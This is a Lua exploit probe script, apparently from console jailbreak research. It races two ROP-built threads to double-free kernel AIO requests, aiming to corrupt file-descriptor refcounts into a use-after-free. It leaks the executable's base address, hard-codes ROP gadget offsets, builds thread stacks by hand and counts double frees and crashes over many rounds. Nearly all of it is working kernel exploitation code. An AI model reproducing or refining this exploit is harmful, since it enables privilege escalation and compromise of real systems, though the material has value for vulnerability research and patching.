-- CRASH_CLASS: HIGH
-- PROBE 65r: test fd refcount corruption via AIO double-free
--
-- Hypothesis: the AIO delete handler releases the fd reference.
-- If both racing threads release it, the fd's refcount drops by 2
-- instead of 1. If refcount reaches 0, the struct file is freed
-- while the fd table entry still points to it → fd-level UAF.
--
-- Test: create a fresh fd (kqueue/socketpair), use it for AIO,
-- double-free the AIO request, check if the fd is still valid.
--
-- Also test: use fd_zero (/dev/zero) for AIO and check if it
-- dies after multiple rounds of double-free.

print("=== PROBE 65r: fd refcount via AIO double-free ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

local BATCH = 16
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_with_fd(fd)
    local reqs = memory.alloc(0x30)
    local data_buf = memory.alloc(0x100)
    local result_buf = memory.alloc(0x100)
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

-- Check if an fd is valid via fstat
local function fd_valid(fd)
    local buf = memory.alloc(0x100)
    local ok2, rv2 = pcall(function() return mk(189)(uint64(fd), uint64(N(buf))) end)
    return ok2 and sgn(rv2) == 0
end

-- Build delete child
local function build_delete_child(del_ids_addr, count, states_addr)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(del_ids_addr))
    emit(g_pop_rsi); emit(uint64(count))
    emit(g_pop_rdx); emit(uint64(states_addr))
    emit(g_pop_rax); emit(uint64(662))
    emit(stub)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(N(par) + 0x30, tid)
    return par
end

local del_ids = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)

-- [A] Test: does AIO even hold an fd reference?
-- Submit AIO on fd_zero, then normal delete, check fd_zero validity
print("[A] Baseline: does AIO delete affect fd refcount?")
local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print(string.format("  fd_zero=%d valid=%s", fd_zero, fd_valid(fd_zero) and "Y" or "N"))

-- Submit 16, poll, single-thread delete
local base_ids = {}
for i = 1, BATCH do
    local id = submit_with_fd(fd_zero)
    if id ~= 0 then
        poll_one(id)
        table.insert(base_ids, id)
    end
end
-- Single-thread delete (no race)
for _, id in ipairs(base_ids) do
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function()
        mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
end
print(string.format("  after normal delete(16): fd_zero valid=%s", fd_valid(fd_zero) and "Y" or "N"))

if not alive() then print("DEAD after baseline"); return end

-- [B] Test: does double-free corrupt fd_zero's refcount?
print("")
print("[B] Double-free → check fd_zero validity")

local total_doubles = 0
for round = 1, 10 do
    if not alive() then
        print(string.format("  round %d: DEAD", round))
        break
    end

    -- Submit 16 on fd_zero, poll all
    local ids = {}
    for i = 1, BATCH do
        local id = submit_with_fd(fd_zero)
        if id ~= 0 then
            poll_one(id)
            table.insert(ids, id)
        end
    end
    local count = #ids

    -- Race
    for i = 0, count - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end
    local par_A = build_delete_child(N(del_ids), count, N(states_A))
    local par_B = build_delete_child(N(del_ids), count, N(states_B))
    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)
    for w = 1, 50000 do local _ = rd(N(del_ids)) end

    local doubles = 0
    for i = 0, count - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end
    total_doubles = total_doubles + doubles

    if not alive() then
        print(string.format("  round %d: CRASHED (doubles=%d total=%d)", round, doubles, total_doubles))
        break
    end

    local still_valid = fd_valid(fd_zero)
    if not still_valid or doubles > 0 then
        print(string.format("  round %d: doubles=%d total=%d fd_zero=%s%s",
            round, doubles, total_doubles,
            still_valid and "VALID" or "*** INVALID ***",
            not still_valid and " ← FD REFCOUNT CORRUPTED!" or ""))
    end

    if not still_valid then
        print("  *** FD REFCOUNT DROP CONFIRMED! ***")
        break
    end
end

if not alive() then
    print("")
    print("=== 65r COMPLETE (CRASH) ===")
    return
end

-- [C] Test with a dedicated fd per round (not shared /dev/zero)
-- Open many /dev/zero fds, use one per AIO batch, track each
print("")
print("[C] Per-fd test — dedicated fd per AIO batch")

local test_fds = {}
for i = 1, 20 do
    local fd = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
    if fd >= 0 then table.insert(test_fds, fd) end
end
print(string.format("  created %d test fds (range %d-%d)", #test_fds, test_fds[1] or 0, test_fds[#test_fds] or 0))

local refcount_hits = 0
for idx, test_fd in ipairs(test_fds) do
    if not alive() then break end

    local pre_valid = fd_valid(test_fd)
    if not pre_valid then break end -- fd exhaustion

    -- Submit 16 AIO on this specific fd
    local ids = {}
    for i = 1, BATCH do
        local id = submit_with_fd(test_fd)
        if id ~= 0 then
            poll_one(id)
            table.insert(ids, id)
        end
    end
    local count = #ids
    if count == 0 then break end

    -- Double-free race
    for i = 0, count - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end
    local par_A = build_delete_child(N(del_ids), count, N(states_A))
    local par_B = build_delete_child(N(del_ids), count, N(states_B))
    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)
    for w = 1, 50000 do local _ = rd(N(del_ids)) end

    local doubles = 0
    for i = 0, count - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end

    if not alive() then
        print(string.format("  fd[%d]=%d: CRASHED (doubles=%d)", idx, test_fd, doubles))
        break
    end

    local post_valid = fd_valid(test_fd)
    if not post_valid then
        refcount_hits = refcount_hits + 1
        print(string.format("  fd[%d]=%d: *** INVALID after %d doubles! REFCOUNT DROP! ***", idx, test_fd, doubles))
    elseif doubles > 0 then
        -- Double-free happened but fd survived — refcount might have margin
        print(string.format("  fd[%d]=%d: %d doubles, fd still valid (refcount > doubles+1?)", idx, test_fd, doubles))
    end
end

-- [D] Check if multiple rounds drain the refcount
-- Each double-free drops refcount by 1 extra. After enough rounds,
-- the refcount should reach 0.
print("")
print("[D] Repeated double-free on SAME fd to drain refcount")
local drain_fd = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print(string.format("  drain_fd=%d valid=%s", drain_fd, fd_valid(drain_fd) and "Y" or "N"))

local drain_doubles = 0
for round = 1, 50 do
    if not alive() then
        print(string.format("  round %d: DEAD (total doubles=%d)", round, drain_doubles))
        break
    end

    local ids = {}
    for i = 1, BATCH do
        local id = submit_with_fd(drain_fd)
        if id ~= 0 then
            poll_one(id)
            table.insert(ids, id)
        end
    end
    if #ids == 0 then
        print(string.format("  round %d: no IDs (fd dead?)", round))
        break
    end

    for i = 0, #ids - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end
    local par_A = build_delete_child(N(del_ids), #ids, N(states_A))
    local par_B = build_delete_child(N(del_ids), #ids, N(states_B))
    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)
    for w = 1, 50000 do local _ = rd(N(del_ids)) end

    local doubles = 0
    for i = 0, #ids - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end
    drain_doubles = drain_doubles + doubles

    if not alive() then
        print(string.format("  round %d: CRASHED (this-round=%d total=%d)", round, doubles, drain_doubles))
        break
    end

    local still_valid = fd_valid(drain_fd)
    if not still_valid then
        print(string.format("  round %d: *** FD DEAD! doubles this round=%d total=%d ***",
            round, doubles, drain_doubles))
        print("  *** FD REFCOUNT DRAINED TO ZERO BY REPEATED DOUBLE-FREE! ***")
        break
    end

    if round <= 5 or round % 10 == 0 or round == 50 then
        print(string.format("  round %d: doubles=%d total=%d fd=%s",
            round, doubles, drain_doubles, still_valid and "alive" or "DEAD"))
    end
end

print("")
print("[E] SUMMARY")
print(string.format("  total doubles (section B): %d", total_doubles))
print(string.format("  refcount hits (section C): %d", refcount_hits))
print(string.format("  drain doubles (section D): %d", drain_doubles))
print(string.format("  process: %s", alive() and "ALIVE" or "DEAD"))

print("")
print("=== 65r COMPLETE ===")
